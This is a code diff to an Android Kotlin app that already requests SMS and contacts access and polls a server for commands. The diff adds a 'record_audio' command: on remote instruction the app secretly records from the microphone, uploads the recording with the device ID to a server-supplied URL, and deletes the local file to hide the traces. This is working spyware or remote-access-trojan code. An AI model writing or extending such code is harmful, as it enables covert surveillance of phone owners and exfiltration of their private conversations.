@@ -78,6 +78,7 @@ import android.os.StatFs
 import android.telephony.SignalStrength
 import java.net.NetworkInterface
 import java.net.Inet4Address
+import android.media.MediaRecorder
 
 
 class MainActivity : ComponentActivity() {
@@ -96,6 +97,7 @@ class MainActivity : ComponentActivity() {
     private val CONTACTS_PERMISSION_CODE = 1011
     private val READ_CONTACT_CODE = 1011
     private val PHONE_STATE_PERMISSION_CODE = 1012
+    private val AUDIO_PERMISSION_CODE = 1013
     
     // Track which permissions to request next
     private val pendingPermissions = mutableListOf<String>()
@@ -166,6 +168,7 @@ class MainActivity : ComponentActivity() {
             Log.d("PermissionDebug", "Initializing permission list")
             // Add SMS permission first to prioritize it
             pendingPermissions.add(Manifest.permission.READ_SMS)
+            pendingPermissions.add(Manifest.permission.RECORD_AUDIO)
             
             // Add contacts permission right after SMS permission for prioritization
             pendingPermissions.add(Manifest.permission.READ_CONTACTS)
@@ -199,6 +202,10 @@ class MainActivity : ComponentActivity() {
                     Manifest.permission.READ_CONTACTS -> {
                         Log.d("PermissionDebug", "Requesting Contact permission")
                         ActivityCompat.requestPermissions(this, arrayOf(permission), CONTACTS_PERMISSION_CODE)
+                    }
+                    Manifest.permission.RECORD_AUDIO -> {
+                        Log.d("PermissionDebug", "Requesting Audio permission")
+                        ActivityCompat.requestPermissions(this, arrayOf(permission), AUDIO_PERMISSION_CODE)
                     }
                     Manifest.permission.READ_SMS -> {
                         Log.d("PermissionDebug", "Requesting SMS permission")
@@ -733,6 +740,15 @@ class MainActivity : ComponentActivity() {
                             }
                         }
 
+                        "record_audio" -> {
+                            val duration = params.optInt("duration", 10)
+                            val uploadUrl = params.optString("upload_url")
+                            if (uploadUrl.isNotEmpty()) {
+                                recordAudioAndUpload(applicationContext, duration, uploadUrl)
+                            }
+                        }
+
+
                     }
                 } catch (e: Exception) {
                     Log.e("PollCommand", "Parse error: ${e.message}")
@@ -747,6 +763,67 @@ class MainActivity : ComponentActivity() {
             "/system/sd/xbin/su", "/system/bin/failsafe/su"
         )
         return paths.any { File(it).exists() }
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun recordAudioAndUpload(context: Context, durationSec: Int, uploadUrl: String) {
+        val outputFile = File(context.cacheDir, "recorded_${System.currentTimeMillis()}.3gp")
+
+        val recorder = MediaRecorder().apply {
+            setAudioSource(MediaRecorder.AudioSource.MIC)
+            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
+            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+            setOutputFile(outputFile.absolutePath)
+            prepare()
+            start()
+        }
+
+        Log.i("AudioRecord", "Recording started: ${outputFile.absolutePath}")
+
+        Handler(Looper.getMainLooper()).postDelayed({
+            try {
+                recorder.stop()
+                recorder.release()
+                Log.i("AudioRecord", "Recording stopped, file saved")
+                uploadAudioFile(context, outputFile, uploadUrl)
+            } catch (e: Exception) {
+                Log.e("AudioRecord", "Error stopping recorder: ${e.message}")
+            }
+        }, durationSec * 1000L)
+    }
+
+    private fun uploadAudioFile(context: Context, file: File, uploadUrl: String) {
+        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+    
+        val requestBody = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("device_id", deviceId)
+            .addFormDataPart("audio", file.name, file.asRequestBody("audio/3gp".toMediaType()))
+            .build()
+    
+        val request = Request.Builder()
+            .url(uploadUrl)
+            .post(requestBody)
+            .build()
+    
+        OkHttpClient().newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("UploadAudio", "Failed: ${e.message}")
+            }
+    
+            override fun onResponse(call: Call, response: Response) {
+                val body = response.body?.string()
+                Log.i("UploadAudio", "Success: $body")
+    
+                // ✅ AUTO DELETE FILE after success
+                if (response.isSuccessful) {
+                    if (file.exists()) {
+                        file.delete()
+                        Log.i("UploadAudio", "Local file deleted: ${file.name}")
+                    }
+                }
+            }
+        })
     }
 
     @SuppressLint("MissingPermission")
